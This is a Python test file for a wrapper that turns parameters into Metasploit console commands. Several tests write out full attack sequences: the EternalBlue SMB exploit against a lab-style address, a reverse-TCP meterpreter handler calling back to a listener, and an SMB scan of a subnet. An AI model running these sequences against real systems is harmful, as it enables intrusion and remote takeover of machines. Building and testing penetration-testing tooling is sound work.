"""
Tests for MsfconsoleTool implementation.

This module contains tests for the MsfconsoleTool functionality
including parameter-based command generation and backward compatibility.
"""

import pytest
import tempfile
from unittest.mock import AsyncMock, patch

from wish_tools.framework import CommandInput, ToolContext, ToolResult
from wish_tools.tools.msfconsole import MsfconsoleTool


class TestMsfconsoleTool:
    """Test MsfconsoleTool functionality."""

    def test_build_command_sequence_with_parameters(self):
        """Test building command sequence from tool_parameters."""
        tool = MsfconsoleTool()
        
        # Create command with tool_parameters
        command = CommandInput(
            command="exploit",
            timeout_sec=300,
            tool_parameters={
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rhosts": "10.10.10.40",
                "lhost": "10.10.14.1",
                "lport": "4444"
            }
        )
        
        result = tool._build_command_sequence(command)
        
        expected = "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.10.14.1; set LPORT 4444; exploit"
        assert result == expected

    def test_build_command_sequence_backward_compatibility(self):
        """Test backward compatibility with raw command strings."""
        tool = MsfconsoleTool()
        
        # Create command with raw command string (no tool_parameters)
        command = CommandInput(
            command="use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; exploit",
            timeout_sec=300
        )
        
        result = tool._build_command_sequence(command)
        
        # Should return the raw command unchanged
        assert result == "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; exploit"

    def test_build_command_sequence_empty_parameters(self):
        """Test with empty tool_parameters."""
        tool = MsfconsoleTool()
        
        # Create command with empty tool_parameters
        command = CommandInput(
            command="search ms17_010",
            timeout_sec=300,
            tool_parameters={}
        )
        
        result = tool._build_command_sequence(command)
        
        # Should return the raw command since no module is specified
        assert result == "search ms17_010"

    def test_build_from_parameters_auxiliary_module(self):
        """Test building command for auxiliary module."""
        tool = MsfconsoleTool()
        
        command = CommandInput(
            command="run",
            timeout_sec=300,
            tool_parameters={
                "module": "auxiliary/scanner/smb/smb_version",
                "rhosts": "192.168.1.0/24",
                "rport": "445"
            }
        )
        
        result = tool._build_from_parameters(command)
        
        expected = "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; set RPORT 445; run"
        assert result == expected

    def test_build_from_parameters_with_payload(self):
        """Test building command with payload parameter."""
        tool = MsfconsoleTool()
        
        command = CommandInput(
            command="exploit",
            timeout_sec=600,
            tool_parameters={
                "module": "exploit/multi/handler",
                "payload": "windows/meterpreter/reverse_tcp",
                "lhost": "192.168.1.10",
                "lport": "4444"
            }
        )
        
        result = tool._build_from_parameters(command)
        
        expected = "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.10; set LPORT 4444; exploit"
        assert result == expected

    def test_build_from_parameters_with_target(self):
        """Test building command with target parameter."""
        tool = MsfconsoleTool()
        
        command = CommandInput(
            command="exploit",
            timeout_sec=600,
            tool_parameters={
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rhosts": "10.10.10.40",
                "target": "0",
                "lhost": "10.10.14.1"
            }
        )
        
        result = tool._build_from_parameters(command)
        
        expected = "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set TARGET 0; set LHOST 10.10.14.1; exploit"
        assert result == expected

    def test_map_to_msf_parameter(self):
        """Test parameter name mapping."""
        tool = MsfconsoleTool()
        
        # Test standard mappings
        assert tool._map_to_msf_parameter("rhosts") == "RHOSTS"
        assert tool._map_to_msf_parameter("rhost") == "RHOST"
        assert tool._map_to_msf_parameter("lhost") == "LHOST"
        assert tool._map_to_msf_parameter("lport") == "LPORT"
        assert tool._map_to_msf_parameter("rport") == "RPORT"
        assert tool._map_to_msf_parameter("payload") == "PAYLOAD"
        assert tool._map_to_msf_parameter("target") == "TARGET"
        
        # Test unmapped parameter (should be uppercase)
        assert tool._map_to_msf_parameter("custom_param") == "CUSTOM_PARAM"

    def test_build_from_parameters_none_values_filtered(self):
        """Test that None values are filtered out."""
        tool = MsfconsoleTool()
        
        command = CommandInput(
            command="exploit",
            timeout_sec=300,
            tool_parameters={
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rhosts": "10.10.10.40",
                "lhost": "10.10.14.1",
                "lport": None,  # This should be filtered out
                "payload": None  # This should be filtered out
            }
        )
        
        result = tool._build_from_parameters(command)
        
        expected = "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; set LHOST 10.10.14.1; exploit"
        assert result == expected

    def test_build_from_parameters_complex_example(self):
        """Test building complex command with multiple parameters."""
        tool = MsfconsoleTool()
        
        command = CommandInput(
            command="exploit",
            timeout_sec=600,
            tool_parameters={
                "module": "exploit/windows/smb/ms17_010_eternalblue",
                "rhosts": "10.10.10.40-50",
                "rhost": "10.10.10.40",  # Both rhost and rhosts
                "lhost": "10.10.14.1",
                "lport": "4444",
                "payload": "windows/x64/meterpreter/reverse_tcp",
                "target": "0",
                "custom_option": "custom_value"
            }
        )
        
        result = tool._build_from_parameters(command)
        
        # Check that all parameters are included (order may vary due to dict iteration)
        assert "use exploit/windows/smb/ms17_010_eternalblue" in result
        assert "set RHOSTS 10.10.10.40-50" in result
        assert "set RHOST 10.10.10.40" in result
        assert "set LHOST 10.10.14.1" in result
        assert "set LPORT 4444" in result
        assert "set PAYLOAD windows/x64/meterpreter/reverse_tcp" in result
        assert "set TARGET 0" in result
        assert "set CUSTOM_OPTION custom_value" in result
        assert result.endswith("; exploit")

    @pytest.mark.asyncio
    @patch('asyncio.create_subprocess_exec')
    async def test_execute_with_tool_parameters(self, mock_subprocess):
        """Test execute method with tool_parameters integration."""
        # Mock the subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"Test output", b"")
        mock_process.returncode = 0
        mock_subprocess.return_value = mock_process
        
        tool = MsfconsoleTool()
        
        with tempfile.TemporaryDirectory() as temp_dir:
            context = ToolContext(working_directory=temp_dir, run_id="test")
            
            command = CommandInput(
                command="exploit",
                timeout_sec=300,
                tool_parameters={
                    "module": "exploit/windows/smb/ms17_010_eternalblue",
                    "rhosts": "10.10.10.40",
                    "lhost": "10.10.14.1"
                }
            )
            
            result = await tool.execute(command, context)
            
            # Verify subprocess was called with correct parameters
            assert mock_subprocess.called
            call_args = mock_subprocess.call_args[0]
            assert call_args[0] == "msfconsole"
            assert call_args[1] == "-q"
            assert call_args[2] == "-x"
            
            # The command should be built from parameters
            executed_command = call_args[3]
            assert "use exploit/windows/smb/ms17_010_eternalblue" in executed_command
            assert "set RHOSTS 10.10.10.40" in executed_command
            assert "set LHOST 10.10.14.1" in executed_command
            assert "exploit" in executed_command
            assert "exit -y" in executed_command
            
            # Verify result
            assert result.success is True
            assert result.output == "Test output"

    @pytest.mark.asyncio
    @patch('asyncio.create_subprocess_exec')
    async def test_execute_backward_compatibility(self, mock_subprocess):
        """Test execute method maintains backward compatibility."""
        # Mock the subprocess execution
        mock_process = AsyncMock()
        mock_process.communicate.return_value = (b"Test output", b"")
        mock_process.returncode = 0
        mock_subprocess.return_value = mock_process
        
        tool = MsfconsoleTool()
        
        with tempfile.TemporaryDirectory() as temp_dir:
            context = ToolContext(working_directory=temp_dir, run_id="test")
            
            # Use raw command string without tool_parameters
            command = CommandInput(
                command="use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; exploit",
                timeout_sec=300
            )
            
            result = await tool.execute(command, context)
            
            # Verify subprocess was called with the raw command
            assert mock_subprocess.called
            call_args = mock_subprocess.call_args[0]
            executed_command = call_args[3]
            assert "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.40; exploit; exit -y" == executed_command
            
            # Verify result
            assert result.success is True
            assert result.output == "Test output"


if __name__ == "__main__":
    pytest.main([__file__])